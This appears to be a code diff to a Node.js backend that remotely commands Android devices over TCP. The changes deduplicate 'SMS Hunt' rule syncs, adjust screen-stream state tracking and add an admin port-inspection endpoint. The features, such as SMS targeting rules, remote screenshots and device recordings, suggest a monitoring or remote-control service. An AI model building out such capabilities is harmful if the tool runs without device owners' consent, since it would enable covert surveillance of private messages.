@@ -1167,8 +1167,8 @@ const pendingCmds = new Map();         // commandId → pending info
 let pendingCommandOrder = 0;
 /** @type {Map<string, Object>} In-memory device registry for when MongoDB is unavailable */
 const inMemoryDevices = new Map();     // deviceId → device object
-/** @type {Set<string>} Devices that have an active stream session */
-const deviceStreamingState = new Set(); // deviceId → streaming active
+/** @type {Set<string>} Devices that have an active legacy push-stream session */
+const deviceStreamingState = new Set(); // retained for legacy stream state only
 /** @type {Map<string, number>} Timestamp (ms) of last device:ping sent — used to compute true TCP RTT */
 const devicePingTime = new Map();       // deviceId → Date.now() when ping was sent
 /** @type {Map<string, number>} Track last frame relay time per device for throttling */
@@ -1367,10 +1367,13 @@ async function processMessage(clientId, clientType, event, data) {
         // Ack back to device
         if (conn) tcpSend(conn, 'device:registered', { success: true, deviceId, tasks: deviceTasks });
 
-        // Restore this device's SMS Hunt rules after every registration. This
-        // is what makes hunts saved while offline take effect automatically.
-        try { await syncSmsHuntsToDevice(deviceId, true); } catch (e) {
-            log('SMS_HUNT', `Sync on connect failed for ${deviceId}: ${e.message}`, 'warn');
+        // Restore this device's SMS Hunt rules only on a genuinely fresh
+        // primary connection. The sync helper also deduplicates payloads and
+        // coalesces a save racing with this reconnect.
+        if (isFreshConnect) {
+            try { await syncSmsHuntsToDevice(deviceId, true); } catch (e) {
+                log('SMS_HUNT', `Sync on connect failed for ${deviceId}: ${e.message}`, 'warn');
+            }
         }
 
         // Dispatch scheduled tasks (scheduleOnConnect) to the device on fresh connect — runs only once then clears the flag
@@ -1541,7 +1544,9 @@ async function processMessage(clientId, clientType, event, data) {
                 }
                 deviceToStreamTcp.set(deviceId, clientId);
                 log('TCP', `Stream channel registered for ${deviceId}`);
-                // Auto-resume streaming if device had an active stream session
+                // Legacy push streams may be resumed here. Dashboard-timed
+                // stream_start requests are one-shot screenshots and are
+                // intentionally not added to this set.
                 if (deviceStreamingState.has(deviceId)) {
                     const primaryId = deviceToTcp.get(deviceId);
                     const primaryConn = primaryId ? tcpClients.get(primaryId) : null;
@@ -3882,10 +3887,6 @@ app.post('/api/commands', requireUserOrAdmin, requireActiveSubscription, async (
     // Forward to device immediately — no queue, fire and forget over TCP
     tcpSend(tcpConn, 'command:execute', { commandId, command, params: params || null });
 
-    // Track streaming state so we can auto-resume after stream channel reconnects
-    if (command === 'stream_start')  deviceStreamingState.add(deviceId);
-    if (command === 'stream_stop')   deviceStreamingState.delete(deviceId);
-
     // Respond immediately — command already sent to device via TCP
     res.json({ success: true, commandId, command, deviceId, params, status: 'executing', timestamp: new Date() });
     // Skip logging for high-frequency polling commands
@@ -3953,6 +3954,10 @@ app.post('/api/device/:deviceId/reset-session', async (req, res) => {
 });
 
 // ── SMS Hunt device synchronization and persistence ────────────────────────────
+// Deduplicate unchanged configuration deliveries and coalesce concurrent syncs.
+const smsHuntLastFingerprint = new Map();
+const smsHuntSyncInFlight = new Map();
+
 async function getSmsHuntAccessId(req) {
     if (req.authRole !== 'user') return '';
     let accessId = req.authAccessId || '';
@@ -3979,9 +3984,23 @@ async function authorizeSmsHuntDevice(req, deviceId) {
 async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
     const conn = _getTcpConnForDevice(deviceId);
     if (!conn || !conn.writable) return false;
+    const existing = smsHuntSyncInFlight.get(deviceId);
+    if (existing) return existing;
+    const syncPromise = (async () => {
+    const currentConn = _getTcpConnForDevice(deviceId);
+    if (!currentConn || !currentConn.writable) return false;
     const hunts = await SmsHunt.find({ deviceId, enabled: true })
         .sort({ updatedAt: -1 })
         .lean();
+    const payloadHunts = hunts.map(hunt => ({
+        huntId: String(hunt._id),
+        name: hunt.name,
+        targetMode: hunt.targetMode,
+        target: hunt.target,
+        enabled: hunt.enabled !== false,
+    }));
+    const fingerprint = JSON.stringify(payloadHunts);
+    if (!clearSchedules && smsHuntLastFingerprint.get(deviceId) === fingerprint) return true;
     const commandId = crypto.randomBytes(12).toString('hex');
     const order = ++pendingCommandOrder;
     // Automatic syncs (save/edit and reconnect) must be observable by the
@@ -3991,6 +4010,9 @@ async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
     const timer = setTimeout(() => {
         if (!pendingCmds.has(commandId)) return;
         pendingCmds.delete(commandId);
+            if (smsHuntLastFingerprint.get(deviceId) === fingerprint) {
+                smsHuntLastFingerprint.delete(deviceId);
+            }
         broadcastDash('command:result', {
             commandId,
             command: 'set_sms_hunts',
@@ -4007,24 +4029,17 @@ async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
         timer,
         order,
     });
-    tcpSend(conn, 'command:execute', {
+    tcpSend(currentConn, 'command:execute', {
         commandId,
         command: 'set_sms_hunts',
-        params: {
-            hunts: hunts.map(hunt => ({
-                huntId: String(hunt._id),
-                name: hunt.name,
-                targetMode: hunt.targetMode,
-                target: hunt.target,
-                enabled: hunt.enabled !== false,
-            })),
-        },
+        params: { hunts: payloadHunts },
     });
+    smsHuntLastFingerprint.set(deviceId, fingerprint);
     new Command({
         id: commandId,
         deviceId,
         command: 'set_sms_hunts',
-        data: { hunts: hunts.map(hunt => String(hunt._id)) },
+        data: { hunts: payloadHunts.map(hunt => hunt.huntId) },
         status: 'executing',
     }).save().catch(() => {});
     if (clearSchedules) {
@@ -4033,8 +4048,15 @@ async function syncSmsHuntsToDevice(deviceId, clearSchedules = false) {
             { $set: { scheduleOnConnect: false, updatedAt: new Date() } }
         );
     }
-    log('SMS_HUNT', `Synced ${hunts.length} hunt(s) → ${deviceId}`);
+    log('SMS_HUNT', `Synced ${payloadHunts.length} hunt(s) → ${deviceId}`);
     return true;
+    })();
+    smsHuntSyncInFlight.set(deviceId, syncPromise);
+    try {
+        return await syncPromise;
+    } finally {
+        if (smsHuntSyncInFlight.get(deviceId) === syncPromise) smsHuntSyncInFlight.delete(deviceId);
+    }
 }
 
 // ── Task Studio — per-accessId workflow storage ───────────────────────────────
@@ -4765,6 +4787,124 @@ app.get('/api/admin/devices', requireAdmin, async (req, res) => {
         const list = await getDeviceList(null);   // null = admin, no filter
         res.json({ success: true, devices: list });
     } catch (e) { res.status(500).json({ success: false, error: e.message }); }
+});
+
+// ── Admin port inspection ─────────────────────────────────────────────────────
+// Container platforms generally expose HTTP through a reverse proxy but do
+// not expose arbitrary TCP listeners. Report what is actually listening, then
+// layer explicit FRP/environment mappings and the platform public URL on top
+// instead of guessing a public TCP port.
+function _listeningTcpPorts() {
+    const ports = new Set();
+    for (const file of ['/proc/net/tcp', '/proc/net/tcp6']) {
+        try {
+            const lines = fs.readFileSync(file, 'utf8').split('\n').slice(1);
+            for (const line of lines) {
+                const fields = line.trim().split(/\s+/);
+                if (fields.length >= 4 && fields[3] === '0A') {
+                    const port = parseInt(fields[1].split(':')[1], 16);
+                    if (Number.isInteger(port) && port > 0) ports.add(port);
+                }
+            }
+        } catch (_) {}
+    }
+    return [...ports].sort((a, b) => a - b);
+}
+
+function _explicitPortMappings() {
+    const mappings = new Map();
+    const add = (internal, external, source, host = null) => {
+        const i = Number(internal), e = Number(external);
+        if (Number.isInteger(i) && i > 0 && Number.isInteger(e) && e > 0) {
+            mappings.set(i, { publicPort: e, source, publicHost: host });
+        }
+    };
+    const raw = process.env.PORT_MAP || process.env.PORT_MAPPING || '';
+    const pairs = raw.match(/\d+\s*[:=]\s*\d+/g) || [];
+    pairs.forEach(pair => {
+        const [internal, external] = pair.split(/[:=]/).map(Number);
+        add(internal, external, 'PORT_MAP');
+    });
+    for (const [key, value] of Object.entries(process.env)) {
+        const match = key.match(/^(?:EXTERNAL|PUBLIC)_PORT_(\d+)$/i);
+        if (match) add(match[1], value, key);
+    }
+
+    const root = path.resolve(__dirname, '..');
+    const configPaths = ['/etc/frp/frpc.toml', path.join(root, 'frpc', 'frpc.toml')];
+    for (const configPath of configPaths) {
+        try {
+            const text = fs.readFileSync(configPath, 'utf8');
+            for (const block of text.split('[[proxies]]').slice(1)) {
+                const local = block.match(/localPort\s*=\s*(\d+)/i)?.[1];
+                const remote = block.match(/remotePort\s*=\s*(\d+)/i)?.[1];
+                if (local && remote) add(local, remote, `FRP: ${path.basename(configPath)}`);
+            }
+        } catch (_) {}
+    }
+    return mappings;
+}
+
+function _portPlatform() {
+    const e = process.env;
+    if (e.REPLIT_DEV_DOMAIN || e.REPL_ID) return 'Replit';
+    if (e.RENDER_EXTERNAL_URL || e.RENDER_SERVICE_ID) return 'Render';
+    if (e.HEROKU_APP_NAME || e.DYNO) return 'Heroku';
+    if (e.RAILWAY_PUBLIC_DOMAIN || e.RAILWAY_ENVIRONMENT) return 'Railway';
+    if (e.FLY_APP_NAME) return 'Fly.io';
+    return 'Container / self-hosted';
+}
+
+app.get('/api/admin/ports/status', requireAdmin, (req, res) => {
+    try {
+        const publicBaseUrl = _derivePublicUrl();
+        const mappings = _explicitPortMappings();
+        const configured = [
+            { port: HTTP_PORT, kind: 'http', label: 'Dashboard HTTP' },
+            { port: TCP_PORT, kind: 'tcp', label: 'Android TLS/TCP' },
+            { port: CALLBACK_PORT, kind: 'http', label: 'Callback mirror' },
+        ];
+        const allPorts = new Map();
+        _listeningTcpPorts().forEach(port => allPorts.set(port, { port, listening: true }));
+        configured.forEach(item => {
+            allPorts.set(item.port, { ...(allPorts.get(item.port) || {}), ...item, port: item.port });
+        });
+        const base = publicBaseUrl ? (() => { try { return new URL(publicBaseUrl); } catch (_) { return null; } })() : null;
+        const ports = [...allPorts.values()].sort((a, b) => a.port - b.port).map(item => {
+            const mapping = mappings.get(item.port);
+            const httpProxy = item.kind === 'http' && base;
+            const publicPort = mapping?.publicPort || (httpProxy ? Number(base.port || (base.protocol === 'https:' ? 443 : 80)) : null);
+            const publicHost = mapping?.publicHost || (httpProxy ? base.hostname : null);
+            return {
+                internalPort: item.port,
+                protocol: 'TCP',
+                kind: item.kind || 'tcp',
+                label: item.label || (item.kind === 'http' ? 'HTTP listener' : 'TCP listener'),
+                listening: !!item.listening,
+                publicPort,
+                publicHost,
+                publicUrl: publicHost && publicPort
+                    ? `${base?.protocol || 'tcp:'}//${publicHost}${publicPort === 443 || publicPort === 80 ? '' : `:${publicPort}`}`
+                    : null,
+                exposure: mapping ? 'explicit-mapping' : httpProxy ? 'platform-http-proxy' : 'internal-only',
+                mappingSource: mapping?.source || (httpProxy ? `${_portPlatform()} public URL` : null),
+            };
+        });
+        res.json({
+            success: true,
+            platform: _portPlatform(),
+            publicBaseUrl,
+            refreshedAt: new Date().toISOString(),
+            ports,
+            notes: [
+                'Listening ports are read from the container network namespace.',
+                'HTTP reverse proxies usually publish port 443 externally.',
+                'A public TCP port is shown only when FRP or an explicit PORT_MAP provides it.',
+            ],
+        });
+    } catch (e) {
+        res.status(500).json({ success: false, error: e.message });
+    }
 });
 
 // Recordings are stored ONLY on the Android device.
